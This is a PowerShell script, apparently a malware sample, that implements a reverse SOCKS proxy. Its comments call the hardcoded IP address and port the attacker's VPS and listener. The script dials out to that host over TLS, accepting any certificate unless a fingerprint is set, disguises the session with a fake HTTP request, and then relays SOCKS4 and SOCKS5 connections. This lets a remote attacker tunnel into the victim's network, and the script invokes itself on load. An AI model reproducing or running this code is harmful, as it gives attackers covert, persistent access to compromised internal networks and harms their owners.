# attacker's hardcoded vps address
$vps = "77.105.146.184"

# attacker's listening port
$listenPort = 4477

# optional argument for validating the attacker's sha1 fingerprint
# $certFingerprint = ""

[ScriptBlock]$SocksConnectionMgr = {
    param($vars)
    $Script = {
            param($vars)
            $vars.inStream.CopyTo($vars.outStream)
            Exit
    }
    $rsp=$vars.rsp;
    function Get-IpAddress{
        param($ip)
        IF ($ip -as [ipaddress]){
            return $ip
        }else{
            $ip2 = [System.Net.Dns]::GetHostAddresses($ip)[0].IPAddressToString;
        }
        return $ip2
    }
    $client=$vars.cliConnection
    $buffer = New-Object System.Byte[] 32
    try
    {
        $cliStream = $vars.cliStream
        $cliStream.Read($buffer,0,2) | Out-Null
        $socksVer=$buffer[0]
        if ($socksVer -eq 5){
            $cliStream.Read($buffer,2,$buffer[1]) | Out-Null
            for ($i=2; $i -le $buffer[1]+1; $i++) {
                if ($buffer[$i] -eq 0) {break}
            }
            if ($buffer[$i] -ne 0){
                $buffer[1]=255
                $cliStream.Write($buffer,0,2)
            }else{
                $buffer[1]=0
                $cliStream.Write($buffer,0,2)
            }
            $cliStream.Read($buffer,0,4) | Out-Null
            $cmd = $buffer[1]
            $atyp = $buffer[3]
            if($cmd -ne 1){
                $buffer[1] = 7
                $cliStream.Write($buffer,0,2)
                throw "Not a connect"
            }
            if($atyp -eq 1){
                $ipv4 = New-Object System.Byte[] 4
                $cliStream.Read($ipv4,0,4) | Out-Null
                $ipAddress = New-Object System.Net.IPAddress(,$ipv4)
                $hostName = $ipAddress.ToString()
            }elseif($atyp -eq 3){
                $cliStream.Read($buffer,4,1) | Out-Null
                $hostBuff = New-Object System.Byte[] $buffer[4]
                $cliStream.Read($hostBuff,0,$buffer[4]) | Out-Null
                $hostName = [System.Text.Encoding]::ASCII.GetString($hostBuff)
            }
            else{
                $buffer[1] = 8
                $cliStream.Write($buffer,0,2)
                throw "Not a valid destination address"
            }
            $cliStream.Read($buffer,4,2) | Out-Null
            $destPort = $buffer[4]*256 + $buffer[5]
            $destHost = Get-IpAddress($hostName)
            if($destHost -eq $null){
                $buffer[1]=4
                $cliStream.Write($buffer,0,2)
                throw "Cant resolve destination address"
            }
            $tmpServ = New-Object System.Net.Sockets.TcpClient($destHost, $destPort)
            if($tmpServ.Connected){
                $buffer[1]=0
                $buffer[3]=1
                $buffer[4]=0
                $buffer[5]=0
                $cliStream.Write($buffer,0,10)
                $cliStream.Flush()
                $srvStream = $tmpServ.GetStream()
                $AsyncJobResult2 = $srvStream.CopyToAsync($cliStream)
                $AsyncJobResult = $cliStream.CopyToAsync($srvStream)
                $AsyncJobResult.AsyncWaitHandle.WaitOne();
                $AsyncJobResult2.AsyncWaitHandle.WaitOne();

            }
            else{
                $buffer[1]=4
                $cliStream.Write($buffer,0,2)
                throw "Cant connect to host"
            }
       }elseif($socksVer -eq 4){
            $cmd = $buffer[1]
            if($cmd -ne 1){
                $buffer[0] = 0
                $buffer[1] = 91
                $cliStream.Write($buffer,0,2)
                throw "Not a connect"
            }
            $cliStream.Read($buffer,2,2) | Out-Null
            $destPort = $buffer[2]*256 + $buffer[3]
            $ipv4 = New-Object System.Byte[] 4
            $cliStream.Read($ipv4,0,4) | Out-Null
            $destHost = New-Object System.Net.IPAddress(,$ipv4)
            $buffer[0]=1
            while ($buffer[0] -ne 0){
                $cliStream.Read($buffer,0,1)
            }
            $tmpServ = New-Object System.Net.Sockets.TcpClient($destHost, $destPort)

            if($tmpServ.Connected){
                $buffer[0]=0
                $buffer[1]=90
                $buffer[2]=0
                $buffer[3]=0
                $cliStream.Write($buffer,0,8)
                $cliStream.Flush()
                $srvStream = $tmpServ.GetStream()
                $AsyncJobResult2 = $srvStream.CopyToAsync($cliStream)
                $AsyncJobResult = $cliStream.CopyTo($srvStream)
                $AsyncJobResult.AsyncWaitHandle.WaitOne();
                $AsyncJobResult2.AsyncWaitHandle.WaitOne();
            }
       }else{
            throw "Unknown socks version"
       }
    }
    catch {
        #$_ >> "error.log"
    }
    finally {
        if ($client -ne $null) {
            $client.Dispose()
        }
        if ($tmpServ -ne $null) {
            $tmpServ.Dispose()
        }
        Exit;
    }
}

function Invoke-ReverseSocksProxy{
    param (

            [Switch]$useSystemProxy = $false,

            [String]$certFingerprint = "",

            [Int]$threads = 200,

            [Int]$maxRetries = 0

     )
    try{
        $currentTry = 0;
        $rsp = [runspacefactory]::CreateRunspacePool(1,$threads);
        $rsp.CleanupInterval = New-TimeSpan -Seconds 30;
        $rsp.open();
        while($true){
            try{
                if($useSystemProxy -eq $false){
                        $client = New-Object System.Net.Sockets.TcpClient($vps, $listenPort)
                        $cliStream_clear = $client.GetStream()
                    }else{
                        $ret = getProxyConnection -vps $vps -listenPort $listenPort
                        $client = $ret[0]
                        $cliStream_clear = $ret[1]
                }
                if($certFingerprint -eq ''){
                    $cliStream = New-Object System.Net.Security.SslStream($cliStream_clear,$false,({$true} -as[Net.Security.RemoteCertificateValidationCallback]));
                }else{
                    $cliStream = New-Object System.Net.Security.SslStream($cliStream_clear,$false,({return $args[1].GetCertHashString() -eq $certFingerprint } -as[Net.Security.RemoteCertificateValidationCallback]));
                }
                $cliStream.AuthenticateAsClient($vps)
                $currentTry = 0;
                $buffer = New-Object System.Byte[] 32
                $buffer2 = New-Object System.Byte[] 122
                $FakeRequest = [System.Text.Encoding]::Default.GetBytes("GET / HTTP/1.1`nHost: "+$vps+"`n`n")
                $cliStream.Write($FakeRequest,0,$FakeRequest.Length)
                $cliStream.ReadTimeout = 5000
                $cliStream.Read($buffer2,0,122) | Out-Null
                $cliStream.Read($buffer,0,5) | Out-Null
                $message = [System.Text.Encoding]::ASCII.GetString($buffer)
                if($message -ne "HELLO"){
                    throw "No Client connected";
                }
                $cliStream.ReadTimeout = 100000;
                $vars = [PSCustomObject]@{"cliConnection"=$client; "rsp"=$rsp; "cliStream" = $cliStream}
                $PS3 = [PowerShell]::Create()
                $PS3.RunspacePool = $rsp;
                $PS3.AddScript($SocksConnectionMgr).AddArgument($vars) | Out-Null
                $PS3.BeginInvoke() | Out-Null
            }catch{
                $currentTry = $currentTry + 1;
                if (($maxRetries -ne 0) -and ($currentTry -eq $maxRetries)){
                    Throw "Cannot connect to handler, max Number of attempts reached, exiting";
                }
                if ($_.Exception.message -eq 'Exception calling "AuthenticateAsClient" with "1" argument(s): "The remote certificate is invalid according to the validation procedure."'){
                    throw $_
                }
                if ($_.Exception.message -eq 'Exception calling "AuthenticateAsClient" with "1" argument(s): "Authentication failed because the remote party has closed the transport stream."'){
                    sleep 5
                }

                if (($_.Exception.Message.Length -ge 121) -and $_.Exception.Message.substring(0,120) -eq 'Exception calling ".ctor" with "2" argument(s): "No connection could be made because the target machine actively refused'){
                    sleep 5
                }
                try{
                    $client.Close()
                    $client.Dispose()
                }catch{}
                    sleep -Milliseconds 200
                }
        }
     }
    catch{
        throw $_;
    }
    finally{
        if ($client -ne $null) {
            $client.Dispose()
            $client = $null
        }
        if ($PS3 -ne $null -and $AsyncJobResult3 -ne $null) {
            $PS3.EndInvoke($AsyncJobResult3) | Out-Null
            $PS3.Runspace.Close()
            $PS3.Dispose()
        }
    }
}

Invoke-ReverseSocksProxy
